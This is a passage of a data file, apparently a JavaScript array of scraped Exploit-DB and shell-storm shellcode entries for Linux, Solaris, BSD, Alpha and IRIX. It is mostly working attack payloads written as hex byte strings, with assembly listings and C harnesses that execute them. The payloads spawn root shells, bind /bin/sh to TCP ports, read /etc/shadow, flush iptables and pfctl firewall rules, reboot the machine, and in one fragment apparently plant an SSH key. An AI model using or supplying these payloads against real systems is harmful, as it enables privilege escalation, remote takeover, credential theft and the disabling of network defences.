"\"\\x68\\x6d\\x62\\x64\\x71\"\t // push   $0x7164626d", "\"\\x68\\x4e\\x32\\x75\\x70\"\t // push   $0x7075324e", "\"\\x68\\x74\\x73\\x6a\\x58\"\t // push   $0x586a7374", "\"\\x68\\x41\\x47\\x45\\x41\"\t // push   $0x41454741", "\"\\x68\\x49\\x77\\x41\\x41\"\t // push   $0x41417749", "\"\\x68\\x41\\x41\\x41\\x42\"\t // push   $0x42414141", "\"\\x68\\x63\\x32\\x45\\x41\"\t // push   $0x41453263", "\"\\x68\\x61\\x43\\x31\\x79\"\t // push   $0x79314361", "\"\\x68\\x42\\x33\\x4e\\x7a\"\t // push   $0x7a4e3342", "\"\\x68\\x41\\x41\\x41\\x41\"\t // push   $0x41414141", "\"\\x68\\x72\\x73\\x61\\x20\"\t // push   $0x20617372", "\"\\x68\\x73\\x73\\x68\\x2d\"\t // push   $0x2d687373", "\"\\x89\\xe1\"\t // mov    %esp,%ecx", "\"\\xb2\\xa9\"\t // mov    $0xa9,%dl", "\"\\x6a\\x04\"\t // push   $0x4   ; sys_write()", "\"\\x58\"\t\t // pop    %eax", "\"\\xcd\\x80\"\t // int    $0x80", "\"\\x34\\xaf\"\t // xor    $0xaf,%al ; 0xa9 xor 0xaf = 0x6 ( sys_close() )", "\"\\xcd\\x80\"\t // int    $0x80", "\"\\x04\\x0f\"\t // add    $0xf,%al  ; sys_chmod()", "\"\\x89\\xf3\"\t // mov    %esi,%ebx", "\"\\x66\\xb9\\x80\\x01\"\t // mov    $0x180,%cx ; 0600  para que ssh no se queje", "\"\\xcd\\x80\"\t // int    $0x80", "\"\\x6a\\x01\"\t // push   $0x1      ; adios exit", "\"\\x58\"\t\t // pop    %eax", "\"\\xcd\\x80\";\t // int    $0x80", "", "main(){printf(\"%d bytes\\n\", strlen(sc));}", "//main(){(*(void (*)()) sc)();}", "", "// milw0rm.com [2008-11-23]"]},
{"Title": "Linux/x64 - Flush IPTables Rules (/sbin/iptables -F) Shellcode (84 bytes)", "Author": "gat3way", "Published": ": 2008-11-28", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/13296.c", "View": "https://old.exploit-db.com/raw/13296/", "code": ["/*", "", "/sbin/iptables -F  shellcode for AMD64 (84 bytes)", "", "By gat3way <gat3way(at )gat3way(dot)eu>", "", "", "The code to load the sc[] into an executable mmap()-ed executable page", "was shamelessly stolen by hophet (too lazy :))", "Thanks Gustavo C. for the inspiration - x86_64 assembly is fun :)", "", "# Here is the boring assembly code:", "# push /sbin/iptables:", "        movq    $0x73656c626174ffff, %rbx", "        shr     $16, %rbx", "        push    %rbx", "        movq    $0x70692f6e6962732f, %rbx", "        push    %rbx", "        movq    %rsp, %rdi", "# push params", "        movq    $0x462dffffffffffff,%rbx", "        shr     $48, %rbx", "        push    %rbx", "        movq    %rsp, %rcx", "        movq    $0x46ffffffffffffff,%rbx", "        shr     $56, %rbx", "        push    %rbx", "        movq    %rsp, %rax", "        xor     %rbx, %rbx", "        push    %rbx", "        push    %rcx", "        push    %rax", "        movq    %rsp,%rsi", "        movq    %rsp,%rdx", "# execve", "        xorq    %rax,%rax", "        mov     $0x3b,%al", "        syscall", "", "", "Hm...pak ne moga da izmislia neshto umno :(", "", "*/", "", "", "", "#include <sys/types.h>", "#include <sys/stat.h>", "#include <sys/mman.h>", "#include <err.h>", "#include <fcntl.h>", "#include <stdio.h>", "#include <string.h>", "#include <unistd.h>", "", "", "char sc[]=\"\\x48\\xbb\\xff\\xff\"", "\"\\x74\\x61\\x62\\x6c\\x65\\x73\\x48\\xc1\\xeb\\x10\\x53\\x48\\xbb\\x2f\\x73\\x62\"", "\"\\x69\\x6e\\x2f\\x69\\x70\\x53\\x48\\x89\\xe7\\x48\\xbb\\xff\\xff\\xff\\xff\\xff\"", "\"\\xff\\x2d\\x46\\x48\\xc1\\xeb\\x30\\x53\\x48\\x89\\xe1\\x48\\xbb\\xff\\xff\\xff\"", "\"\\xff\\xff\\xff\\xff\\x46\\x48\\xc1\\xeb\\x38\\x53\\x48\\x89\\xe0\\x48\\x31\\xdb\"", "\"\\x53\\x51\\x50\\x48\\x89\\xe6\\x48\\x89\\xe2\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05\";", "", "void main()", "{", "        void (*p)();", "        int fd;", "", "        printf(\"Lenght: %d\\n\", strlen(sc));", "        fd = open(\"/tmp/. \", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);", "        if (fd < 0)", "                err(1, \"open\");", "", "        write(fd, sc, strlen(sc));", "        if ((lseek(fd, 0L, SEEK_SET)) < 0)", "                err(1, \"lseek\");", "", "        p = (void (*)())mmap(NULL, strlen(sc), PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);", "        if (p == (void (*)())MAP_FAILED)", "                err(1, \"mmap\");", "        p();", "        return 0;", "}", "", "// milw0rm.com [2008-11-28]"]},
{"Title": "Solaris/x86 - setuid(0) + execve(/bin/sh) + exit(0) + Null-Free Shellcode (39 bytes)", "Author": "sm4x", "Published": ": 2008-12-02", "Platform": "Solaris_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-112.php", "View": null, "code": ["/*", "; sm4x 2008", "; setuid(0), execve('/bin/sh', '/bin/sh', 0),", "; 39 bytes NizzULL free (you know...)", "; SunOS sol01 5.11 snv_86 i86pc i386 i86pc Solaris", "; quick port to drop root sh -  ;)  - SunOS is pwnij", "", "global _start", "_start:", "", "xor     eax, eax", "", "; --- setuid(0)", "push    eax", "push    eax", "mov     al, 0x17", "int     0x91", "", "; setup //bin/sh", "push    eax", "push    0x68732f6e", "push    0x69622f2f", "mov     ebx, esp", "", "; --- array setup", "push    eax     ; null", "push    ebx     ; //bin/sh", "mov     edx, esp", "", "; -- execve()", "push    eax     ; 0", "push    edx     ; array { \"//bin/sh\", 0}", "push    ebx     ; //bin/sh", "mov     al, 0x3b", "push    eax", "int     0x91", "", "; --- exit", "inc\teax", "push    eax", "push    eax", "int     0x91", "", "*/", "", "#include <stdio.h>", "", "char code[] =   \"\\x31\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x91\\x50\\x68\"", "\t\t\"\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\"", "\t\t\"\\xe3\\x50\\x53\\x89\\xe2\\x50\\x52\\x53\\xb0\\x3b\"", "\t\t\"\\x50\\xcd\\x91\\x40\\x50\\x50\\xcd\\x91\";", "", "", "int main(int argc, char **argv) {", " int (*func)();", " printf(\"Bytes: %d\\n\", sizeof(code));", " func = (int (*)()) code;", " (int)(*func)();", "}", "", "// milw0rm.com [2008-12-02]"]},
{"Title": "Solaris/x86 - setuid(0) + execve(/bin/cat, /etc/shadow) + exit(0) Shellcode (59 bytes)", "Author": "sm4x", "Published": ": 2008-12-02", "Platform": "Solaris_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-111.php", "View": null, "code": ["/*", "; sm4x 2008", "; /bin/cat /etc/shadow", "; 59 bytes", "; SunOS sol01 5.11 snv_86 i86pc i386 i86pc Solaris", "; (port to SunOS to pwn a b0x - thank god for that default __unix__ CRYPT_DEFAULT!!!!)", "; this is what happens when ur work takes away root pirv on a SunOS box :-/", "", "global _start", "_start:", "", "xor     eax, eax", "", "; --- setuid(0)", "push    eax", "push    eax", "mov     al, 0x17", "int     0x91", "", "; --- setup /etc/shadow", "jmp     short   load_file", "ok:", "pop     esi", "", "; setup /bin/cat", "push    eax", "push    0x7461632f", "push    0x6e69622f", "mov     ebx, esp", "", "; --- array setup", "push    eax     ; null", "push    esi     ; /etc/shadow", "push    ebx     ; /bin/cat", "mov     edx, esp", "", "; -- execve()", "push    eax     ; 0", "push    edx     ; array { \"/bin/cat\", \"/etc/shadow\", 0}", "push    ebx     ; /bin/cat", "mov     al, 0x3b", "push    eax", "int     0x91", "", "; --- exit", "inc\teax", "push    eax", "push    eax", "int     0x91", "", "load_file:", "call    ok", "db      '/etc/shadow'", "", "*/", "", "#include <stdio.h>", "", "char code[] =  \"\\x31\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x91\\xeb\\x20\"", "\t\t\"\\x5e\\x50\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\"", "\t\t\"\\x69\\x6e\\x89\\xe3\\x50\\x56\\x53\\x89\\xe2\\x50\"", "\t\t\"\\x52\\x53\\xb0\\x3b\\x50\\xcd\\x91\\x40\\x50\\x50\"", "\t\t\"\\xcd\\x91\\xe8\\xdb\\xff\\xff\\xff\\x2f\\x65\\x74\"", "\t\t\"\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77\";", "", "int main(int argc, char **argv) {", " int (*func)();", " printf(\"Bytes: %d\\n\", sizeof(code));", " func = (int (*)()) code;", " (int)(*func)();", "}", "", "// milw0rm.com [2008-12-02]"]},
{"Title": "Alpha - /bin/sh Shellcode (80 bytes)", "Author": "Lamont Granquist", "Published": ": 2009-01-01", "Platform": "Alpha", "Download": "http://shell-storm.org/shellcode/files/shellcode-134.php", "View": null, "code": ["/*", "   Lamont Granquist", "   lamontg@hitl.washington.edu", "   lamontg@u.washington.edu", "*/", "", "int rawcode[] = {", "  0x2230fec4,              /* subq $16,0x13c,$17 [2000]*/", "  0x47ff0412,              /* clr $18            [2000]*/", "  0x42509532,              /* subq $18, 0x84     [2000]*/", "  0x239fffff,              /* xor $18, 0xffffffff, $18 */", "  0x4b84169c,", "  0x465c0812,", "  0xb2510134,              /* stl $18, 0x134($17)[2000]*/", "  0x265cff98,              /* lda $18, 0xff978cd0[2000]*/", "  0x22528cd1,", "  0x465c0812,              /* xor $18, 0xffffffff, $18 */", "  0xb2510140,              /* stl $18, 0x140($17)[2000]*/", "  0xb6110148,              /* stq $16,0x148($17) [2000]*/", "  0xb7f10150,              /* stq $31,0x150($17) [2000]*/", "  0x22310148,              /* addq $17,0x148,$17 [2000]*/", "  0x225f013a,              /* ldil $18,0x13a     [2000]*/", "  0x425ff520,              /* subq $18,0xff,$0   [2000]*/", "  0x47ff0412,              /* clr $18            [2000]*/", "  0xffffffff,              /* call_pal 0x83      [2000]*/", "  0xd21fffed,              /* bsr $16,$l1    ENTRY     */", "  0x6e69622f,              /* .ascii \"/bin\"      [2000]*/", "  /* .ascii \"/sh\\0\" is generated */", "};"]},
{"Title": "Alpha - execve() Shellcode (112 bytes)", "Author": "anonymous", "Published": ": 2009-01-01", "Platform": "Alpha", "Download": "http://shell-storm.org/shellcode/files/shellcode-136.php", "View": null, "code": ["char shellcode[]=", "        \"\\x30\\x15\\xd9\\x43\"      /* subq $30,200,$16             */", "        /* $16 = $30 - 200", "        /* $16 must have the shellcode address. However, before */", "        /* the bsr instruction, $16 can't have the address.     */", "        /* This instruction just store the meaningless address. */", "        /* The all instruction before bsr are meaningless.      */", "", "        \"\\x11\\x74\\xf0\\x47\"      /* bis $31,0x83,$17             */", "        /* $17 = 0 or 0x83                                      */", "        /* $17 = 0x83                                           */", "        \"\\x12\\x94\\x07\\x42\"      /* addq $16,60,$18              */", "        \"\\xfc\\xff\\x32\\xb2\"      /* stl $17,-4($18)              */", "        /* $17(\"\\x83\\x00\\x00\\x00\") is stored in $16 + 60 - 4    */", "        /* address.                                             */", "        /* ( \"\\xff\\xff\\xff\\xff\" -> \"\\x83\\x00\\x00\\x00\" )         */", "", "        \"\\xff\\x47\\x3f\\x26\"      /* ldah $17,0x47ff($31)         */", "        \"\\x1f\\x04\\x31\\x22\"      /* lda $17,0x041f($17)          */", "        /* $17 = \"\\x1f\\x04\\xff\\x47\"                             */", "        /* \"\\x1f\\x04\\xff\\x47\" is nop instruction.               */", "", "        \"\\xfc\\xff\\x30\\xb2\"      /* stl $17,-4($16)              */", "        /* change \"bsr $16,-28\" instruction\" into nop           */", "        /* instruction to pass through the bsr instruction.     */", "        /* ( \"\\xf9\\xff\\x1f\\xd2\" -> \"\\x1f\\x04\\xff\\x47\" )         */", "", "        \"\\xf9\\xff\\x1f\\xd2\"      /* bsr $16,-28                  */", "        /* Jump to \"bis $31,0x83,$17\" and store the current     */", "        /* address in the $16.                                  */", "        /* After jump, this insturction will be changed into    */", "        /* nop instruction.                                     */", "", "        \"\\x30\\x15\\xd9\\x43\"      /* subq $30,200,$16             */", "        \"\\x31\\x15\\xd8\\x43\"      /* subq $30,192,$17             */", "        \"\\x12\\x04\\xff\\x47\"      /* clr $18                      */", "        \"\\x40\\xff\\x1e\\xb6\"      /* stq $16,-192($30)            */", "        \"\\x48\\xff\\xfe\\xb7\"      /* stq $31,-184($30)            */", "        \"\\x98\\xff\\x7f\\x26\"      /* ldah $19,0xff98($31)         */", "        \"\\xd0\\x8c\\x73\\x22\"      /* lda $19,0x8cd0($19)          */", "        \"\\x12\\x04\\xff\\x47\"      /* clr $18                      */", "        \"\\x40\\xff\\x1e\\xb6\"      /* stq $16,-192($30)            */", "        \"\\x48\\xff\\xfe\\xb7\"      /* stq $31,-184($30)            */", "        \"\\x98\\xff\\x7f\\x26\"      /* ldah $19,0xff98($31)         */", "        \"\\xd0\\x8c\\x73\\x22\"      /* lda $19,0x8cd0($19)          */", "        \"\\x13\\x05\\xf3\\x47\"      /* ornot $31,$19,$19            */", "        \"\\x3c\\xff\\x7e\\xb2\"      /* stl $19,-196($30)            */", "        \"\\x69\\x6e\\x7f\\x26\"      /* ldah $19,0x6e69($31)         */", "        \"\\x2f\\x62\\x73\\x22\"      /* lda $19,0x622f($19)          */", "        \"\\x38\\xff\\x7e\\xb2\"      /* stl $19,-200($30)            */", "        \"\\x13\\x94\\xe7\\x43\"      /* addq $31,60,$19              */", "        \"\\x20\\x35\\x60\\x42\"      /* subq $19,1,$0                */", "", "        \"\\xff\\xff\\xff\\xff\";     /* callsys ( disguised )        */", "        /* This will be changed to \"\\x83\\x00\\x00\\x00\"           */"]},
{"Title": "Alpha - setuid() Shellcode (156 bytes)", "Author": "anonymous", "Published": ": 2009-01-01", "Platform": "Alpha", "Download": "http://shell-storm.org/shellcode/files/shellcode-135.php", "View": null, "code": ["char shellcode[]=", "        \"\\x30\\x15\\xd9\\x43\"      /* subq $30,200,$16             */", "        \"\\x11\\x74\\xf0\\x47\"      /* bis $31,0x83,$17             */", "        \"\\x12\\x14\\x02\\x42\"      /* addq $16,16,$18              */", "        \"\\xfc\\xff\\x32\\xb2\"      /* stl $17,-4($18)              */", "        \"\\x12\\x94\\x09\\x42\"      /* addq $16,76,$18              */", "        \"\\xfc\\xff\\x32\\xb2\"      /* stl $17,-4($18)              */", "        \"\\xff\\x47\\x3f\\x26\"      /* ldah $17,0x47ff($31)         */", "        \"\\x12\\x14\\x02\\x42\"      /* addq $16,16,$18              */", "        \"\\xfc\\xff\\x32\\xb2\"      /* stl $17,-4($18)              */", "        \"\\x12\\x94\\x09\\x42\"      /* addq $16,76,$18              */", "        \"\\xfc\\xff\\x32\\xb2\"      /* stl $17,-4($18)              */", "        \"\\xff\\x47\\x3f\\x26\"      /* ldah $17,0x47ff($31)         */", "        \"\\x1f\\x04\\x31\\x22\"      /* lda $17,0x041f($17)          */", "        \"\\xfc\\xff\\x30\\xb2\"      /* stl $17,-4($16)              */", "        \"\\xf7\\xff\\x1f\\xd2\"      /* bsr $16,-32                  */", "        \"\\x10\\x04\\xff\\x47\"      /* clr $16                      */", "        \"\\x11\\x14\\xe3\\x43\"      /* addq $31,24,$17              */", "        \"\\x20\\x35\\x20\\x42\"      /* subq $17,1,$0                */", "        \"\\xff\\xff\\xff\\xff\"      /* callsys ( disguised )        */", "        \"\\x30\\x15\\xd9\\x43\"      /* subq $30,200,$16             */", "        \"\\x31\\x15\\xd8\\x43\"      /* subq $30,192,$17             */", "        \"\\x12\\x04\\xff\\x47\"      /* clr $18                      */", "        \"\\x40\\xff\\x1e\\xb6\"      /* stq $16,-192($30)            */", "        \"\\x48\\xff\\xfe\\xb7\"      /* stq $31,-184($30)            */", "        \"\\x98\\xff\\x7f\\x26\"      /* ldah $19,0xff98($31)         */", "        \"\\xd0\\x8c\\x73\\x22\"      /* lda $19,0x8cd0($19)          */", "        \"\\x13\\x05\\xf3\\x47\"      /* ornot $31,$19,$19            */", "        \"\\x3c\\xff\\x7e\\xb2\"      /* stl $19,-196($30)            */", "        \"\\x69\\x6e\\x7f\\x26\"      /* ldah $19,0x6e69($31)         */", "        \"\\x2f\\x62\\x73\\x22\"      /* lda $19,0x622f($19)          */", "        \"\\xd0\\x8c\\x73\\x22\"      /* lda $19,0x8cd0($19)          */", "        \"\\x13\\x05\\xf3\\x47\"      /* ornot $31,$19,$19            */", "        \"\\x3c\\xff\\x7e\\xb2\"      /* stl $19,-196($30)            */", "        \"\\x69\\x6e\\x7f\\x26\"      /* ldah $19,0x6e69($31)         */", "        \"\\x2f\\x62\\x73\\x22\"      /* lda $19,0x622f($19)          */", "        \"\\x38\\xff\\x7e\\xb2\"      /* stl $19,-200($30)            */", "        \"\\x13\\x94\\xe7\\x43\"      /* addq $31,60,$19              */", "        \"\\x20\\x35\\x60\\x42\"      /* subq $19,1,$0                */", "        \"\\xff\\xff\\xff\\xff\";     /* callsys ( disguised )        */"]},
{"Title": "BSD/x86 - setreuid(geteuid(), geteuid()) + execve(\"/bin/sh\") Shellcode (36 bytes)", "Author": "Jihyeog Lim", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-814.php", "View": null, "code": ["/*", " * bsd/x86 setreuid/exec shellcode", " *", " * setreuid(geteuid(), geteuid()) and execve(\"/bin/sh\", \"/bin/sh\", 0) ", " * shellcode based on hkpco's setreuid/exec shellcode for linux", " * Tested on FreeBSD", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char shellcode[] =", " \"\\x31\\xc0\\xb0\\x19\\x50\\xcd\\x80\\x50\"", " \"\\x50\\x31\\xc0\\xb0\\x7e\\x50\\xcd\\x80\" // setreuid(geteuid(), getuid());", " \"\\xeb\\x0d\\x5f\\x31\\xc0\\x50\\x89\\xe2\"", " \"\\x52\\x57\\x54\\xb0\\x3b\\xcd\\x80\\xe8\"", " \"\\xee\\xff\\xff\\xff/bin/sh\"; // exec(/bin/sh)", "", "int main()", "{", "int (*f)() = (int (*)())shellcode;", " printf(\"%d\\n\",strlen(shellcode));", "f();", " return 0;", "}"]},
{"Title": "FreeBSD/x64 - execve(/bin/sh) Shellcode (28 bytes)", "Author": "Gitsnik", "Published": ": 2009-01-01", "Platform": "FreeBSD_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-866.php", "View": null, "code": ["/*", "* Gitsnik, @dracyrys", "* FreeBSD x86_64 execve, 28 bytes", "*", "*/", "", "C source:", "char code[] = \\", "\"\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x04\\x3b\\x48\\xbb\"", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x52\\x53\"", "\"\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\";", "", "Intel Assembly:", "", "global _start", "", ";", "; 28 byte execve FreeBSD x86_64", ";", "; [gitsnik@bsd64]$ nasm -f elf64 shell.nasm -o shell.o", "; [gitsnik@bsd64]$ ld -o shell shell.o", "; [gitsnik@bsd64]$ ./shell", "; $ exit", "; [gitsnik@bsd64]$", ";", "", "section .text", "", "_start:", "xor rcx, rcx", "mul rcx", "", "add al, 0x3b     ; execve()", "mov rbx, 0x68732f2f6e69622f ; hs//nib/", "", "; Argument one shell[0] = \"/bin//sh\"", "push rdx     ; null", "push rbx     ; hs//nib/", "", "; We need pointers for execve()", "push rsp     ; *pointer to shell[0]", "pop rdi      ; Argument 1", "", "; Argument two shell (including address of each argument in array)", "push rdx     ; null", "push rdi     ; address of shell[0]", "", "; We need pointers for execve()", "push rsp     ; address of char * shell", "pop rsi      ; Argument 2", "", "syscall"]},
{"Title": "FreeBSD/x86 - execv(/bin/sh) Shellcode (23 bytes)", "Author": "Tosh", "Published": ": 2009-01-01", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-749.php", "View": null, "code": ["/*", " -------------- FreeBSD/x86 - execv(\"/bin/sh\") 23 bytes -------------------------", " *  AUTHOR : Tosh", " *   OS    : BSDx86 (Tested on FreeBSD 8.1)", " *   EMAIL : tosh@tuxfamily.org", " */", "", "#include <string.h>", "#include <stdio.h>", "", "", "", "char shellcode[] = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\"", "                   \"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\"", "                   \"\\x54\\x53\\xb0\\x3b\\x50\\xcd\\x80\";", "", "int main(void)", "{", "   void(*f)() = (void*)shellcode;", "", "   printf(\"Len = %d\\n\", sizeof(shellcode)-1);", "   f();", "}", "", "/*!", " %define SYS_EXECV 59", "", "", "section .text", "", "global _start", "", "_start:", "   xor eax, eax", "", "   push eax", "", "   push '//sh'", "   push '/bin'", "", "   mov ebx, esp", "", "   push eax", "   push esp", "   push ebx", "   mov al, SYS_EXECV", "   push eax", "   int 0x80", "*/"]},
{"Title": "FreeBSD/x86 - /sbin/pfctl -F all Shellcode (47 bytes)", "Author": "antrhacks", "Published": ": 2009-01-01", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-609.php", "View": null, "code": ["/* ", " * Title: FreeBSD 8.0-RELEASE/x86 '//sbin/pfctl -F all Shellcode 47 Bytes'", " * Type: Shellcode", " * Author: antrhacks", " * Platform: FreeBSD 8.0-RELEASE", "*/", "", "/* ASSembly", " 31 c0                \txor    %eax,%eax", " 50                   \tpush   %eax", " 68 2d 46 61 6c       \tpush   $0x6c61462d", " 89 e1                \tmov    %esp,%ecx", " 50                   \tpush   %eax", " 68 66 63 74 6c       \tpush   $0x6c746366", " 68 69 6e 2f 70       \tpush   $0x702f6e69", " 68 2f 2f 73 62       \tpush   $0x62732f2f", " 89 e3                \tmov    %esp,%ebx", " 50                   \tpush   %eax", " 51                   \tpush   %ecx", " 53                   \tpush   %ebx", " 89 e1                \tmov    %esp,%ecx", " 50                   \tpush   %eax", " 51                   \tpush   %ecx", " 53                   \tpush   %ebx", " b0 3b                \tmov    $0x3b,%al", " 50                   \tpush   %eax", " cd 80                \tint    $0x80", " 31 c0                \txor    %eax,%eax", " 50                   \tpush   %eax", " 50                   \tpush   %eax", " cd 80                \tint    $0x80", "*/", "", "", "#include <stdio.h>", "", "int main(){", "char shellcode[] = \"\\x31\\xc0\\x50\\x68\\x2d\\x46\\x61\\x6c\\x89\\xe1\\x50\\x68\\x66\\x63\\x74\\x6c\"", "\"\\x68\\x69\\x6e\\x2f\\x70\\x68\\x2f\\x2f\\x73\\x62\\x89\\xe3\\x50\\x51\\x53\"", "\"\\x89\\xe1\\x50\\x51\\x53\\xb0\\x3b\\x50\\xcd\\x80\\x31\\xc0\\x50\\x50\\xcd\\x80\"; ", "", " printf(\"[*] ShellCode size (bytes): %d\\n\\n\", sizeof(shellcode)-1 );", "", "(*(void (*)())shellcode)();", "", "return 0;", "}"]},
{"Title": "FreeBSD/x86 - Bind (41254/TCP) Shell (/bin/sh) Shellcode (115 bytes)", "Author": "zillion", "Published": ": 2009-01-01", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-674.php", "View": null, "code": ["/*", "", " FreeBSD shellcode that binds /bin/sh to port 41254", " Assembly code and explanation will be released on safemode.org soon.", "", " Written by zillion (zillion at safemode.org)", "", "*/", "", "char shellcode[] =", "        \"\\xeb\\x64\\x5e\\x31\\xc0\\x88\\x46\\x07\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xb0\"", "        \"\\x61\\x50\\xcd\\x80\\x89\\xc2\\x31\\xc0\\xc6\\x46\\x09\\x02\\x66\\xc7\\x46\"", "        \"\\x0a\\xa1\\x26\\x89\\x46\\x0c\\x6a\\x10\\x8d\\x46\\x08\\x50\\x52\\x31\\xc0\"", "        \"\\xb0\\x68\\x50\\xcd\\x80\\x6a\\x01\\x52\\x31\\xc0\\xb0\\x6a\\x50\\xcd\\x80\"", "        \"\\x31\\xc0\\x50\\x50\\x52\\xb0\\x1e\\x50\\xcd\\x80\\xb1\\x03\\xbb\\xff\\xff\"", "        \"\\xff\\xff\\x89\\xc2\\x43\\x53\\x52\\xb0\\x5a\\x50\\xcd\\x80\\x80\\xe9\\x01\"", "        \"\\x75\\xf3\\x31\\xc0\\x50\\x50\\x56\\xb0\\x3b\\x50\\xcd\\x80\\xe8\\x97\\xff\"", "        \"\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x23\";", "", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "FreeBSD/x86 - reboot() Shellcode (15 bytes)", "Author": "zillion", "Published": ": 2009-01-01", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-677.php", "View": null, "code": ["/*", "", "FreeBSD reboot() shellcode", "", "This will halt a system, which takes it offline until someone reboots it.", "", "Written by zillion (at safemode.org", "", "*/", "", "char shellcode[] =", "        \"\\x31\\xc0\\x66\\xba\\x0e\\x27\\x66\\x81\\xea\\x06\\x27\\xb0\\x37\\xcd\\x80\";", "", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "IRIX - execve(/bin/sh -c) Shellcode (72 bytes)", "Author": "anonymous", "Published": ": 2009-01-01", "Platform": "IRIX", "Download": "http://shell-storm.org/shellcode/files/shellcode-139.php", "View": null, "code": ["char cmdshellcode[]=", "                      \"\\x04\\x10\\xff\\xff\"       /* bltzal  $zero,<_cmdshellcode> */", "                      \"\\x24\\x02\\x03\\xf3\"       /* li      $v0,1011              */", "                      \"\\x23\\xff\\x08\\xf4\"       /* addi    $ra,$ra,2292          */", "                      \"\\x23\\xe4\\xf7\\x40\"       /* addi    $a0,$ra,-2240         */", "                      \"\\x23\\xe5\\xfb\\x24\"       /* addi    $a1,$ra,-1244         */", "                      \"\\xaf\\xe4\\xfb\\x24\"       /* sw      $a0,-1244($ra)        */", "                      \"\\x23\\xe6\\xf7\\x48\"       /* addi    $a2,$ra,-2232         */", "                      \"\\xaf\\xe6\\xfb\\x28\"       /* sw      $a2,-1240($ra)        */", "                      \"\\x23\\xe6\\xf7\\x4c\"       /* addi    $a2,$ra,-2228         */", "                      \"\\xaf\\xe6\\xfb\\x2c\"       /* sw      $a2,-1236($ra)        */", "                      \"\\xaf\\xe0\\xfb\\x30\"       /* sw      $zero,-1232($ra)      */", "                      \"\\xa3\\xe0\\xf7\\x47\"       /* sb      $zero,-2233($ra)      */", "                      \"\\xa3\\xe0\\xf7\\x4a\"       /* sb      $zero,-2230($ra)      */", "                      \"\\x02\\x04\\x8d\\x0c\"       /* syscall                       */", "                      \"\\x01\\x08\\x40\\x25\"       /* or      $t0,$t0,$t0           */", "                      \"/bin/sh -c  \"", "                  ;"]},
{"Title": "IRIX - execve(/bin/sh) Shellcode (43 bytes)", "Author": "anonymous", "Published": ": 2009-01-01", "Platform": "IRIX", "Download": "http://shell-storm.org/shellcode/files/shellcode-141.php", "View": null, "code": ["char shellcode[]=", "                      \"\\x04\\x10\\xff\\xff\"             /* bltzal  $zero,<_shellcode>    */", "                      \"\\x24\\x02\\x03\\xf3\"             /* li      $v0,1011              */", "                      \"\\x23\\xff\\x02\\x14\"             /* addi    $ra,$ra,532           */", "                      \"\\x23\\xe4\\xfe\\x08\"             /* addi    $a0,$ra,-504          */", "                      \"\\x23\\xe5\\xfe\\x10\"             /* addi    $a1,$ra,-496          */", "                      \"\\xaf\\xe4\\xfe\\x10\"             /* sw      $a0,-496($ra)         */", "                      \"\\xaf\\xe0\\xfe\\x14\"             /* sw      $zero,-492($ra)       */", "                      \"\\xa3\\xe0\\xfe\\x0f\"             /* sb      $zero,-497($ra)       */", "                      \"\\x03\\xff\\xff\\xcc\"             /* syscall                       */", "                      \"/bin/sh\"", "                   ;"]}
]

const pag_6 = [{"Title": "IRIX - Bind (/TCP)Shell (/bin/sh) Shellcode (364 bytes)", "Author": "scut/teso", "Published": ": 2009-01-01", "Platform": "IRIX", "Download": "http://shell-storm.org/shellcode/files/shellcode-138.php", "View": null, "code": ["/* 364 byte MIPS/Irix PIC listening portshell shellcode. -scut/teso", " */", "unsigned long int shellcode[] = {", "                0x2416fffd,     /* li           $s6, -3                 */", "                0x02c07027,     /* nor          $t6, $s6, $zero         */", "                0x01ce2025,     /* or           $a0, $t6, $t6           */", "                0x01ce2825,     /* or           $a1, $t6, $t6           */", "                0x240efff9,     /* li           $t6, -7                 */", "                0x01c03027,     /* nor          $a2, $t6, $zero         */", "                0x24020453,     /* li           $v0, 1107 (socket)      */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "", "                0x3050ffff,     /* andi         $s0, $v0, 0xffff        */", "                0x280d0101,     /* slti         $t5, $zero, 0x0101      */", "                0x240effee,     /* li           $t6, -18                */", "                0x01c07027,     /* nor          $t6, $t6, $zero         */", "                0x01cd6804,     /* sllv         $t5, $t5, $t6           */", "                0x240e7350,     /* li           $t6, 0x7350 (port)      */", "                0x01ae6825,     /* or           $t5, $t5, $t6           */", "                0xafadfff0,     /* sw           $t5, -16($sp)           */", "                0xafa0fff4,     /* sw           $zero, -12($sp)         */", "                0xafa0fff8,     /* sw           $zero, -8($sp)          */", "                0xafa0fffc,     /* sw           $zero, -4($sp)          */", "                0x02102025,     /* or           $a0, $s0, $s0           */", "                0x240effef,     /* li           $t6, -17                */", "                0x01c03027,     /* nor          $a2, $t6, $zero         */", "                0x03a62823,     /* subu         $a1, $sp, $a2           */", "                0x24020442,     /* li           $v0, 1090 (bind)        */", "                0x0101010c,     /* 